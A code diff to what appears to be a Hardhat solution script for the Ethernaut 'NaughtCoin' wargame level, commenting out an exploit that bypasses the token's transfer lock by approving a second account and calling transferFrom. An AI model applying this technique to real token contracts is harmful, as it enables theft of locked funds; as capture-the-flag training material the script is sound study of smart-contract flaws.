@@ -16,29 +16,31 @@ async function checkSucces(attacker: SignerWithAddress, target: Contract) {
 }
 
 async function main() {
-  const [attacker, recipient] = await ethers.getSigners();
-  const NaughtCoin = setTargetContract();
-  let tx = await NaughtCoin.connect(attacker).approve(
-    recipient.address,
-    ethers.constants.MaxUint256
-  );
-  await tx.wait();
-  const balance = await NaughtCoin.connect(attacker).balanceOf(
-    attacker.address
-  );
+  console.log("configure recipient");
 
-  tx = await attacker.sendTransaction({
-    to: recipient.address,
-    value: ethers.utils.parseEther("0.001"),
-  });
-  await tx.wait();
-  tx = await NaughtCoin.connect(recipient).transferFrom(
-    attacker.address,
-    recipient.address,
-    balance
-  );
-  await tx.wait();
-  checkSucces(attacker, NaughtCoin);
+  // const [attacker, recipient] = await ethers.getSigners();
+  // const NaughtCoin = setTargetContract();
+  // let tx = await NaughtCoin.connect(attacker).approve(
+  //   recipient.address,
+  //   ethers.constants.MaxUint256
+  // );
+  // await tx.wait();
+  // const balance = await NaughtCoin.connect(attacker).balanceOf(
+  //   attacker.address
+  // );
+
+  // tx = await attacker.sendTransaction({
+  //   to: recipient.address,
+  //   value: ethers.utils.parseEther("0.001"),
+  // });
+  // await tx.wait();
+  // tx = await NaughtCoin.connect(recipient).transferFrom(
+  //   attacker.address,
+  //   recipient.address,
+  //   balance
+  // );
+  // await tx.wait();
+  // checkSucces(attacker, NaughtCoin);
 }
 
 main().catch((error) => {
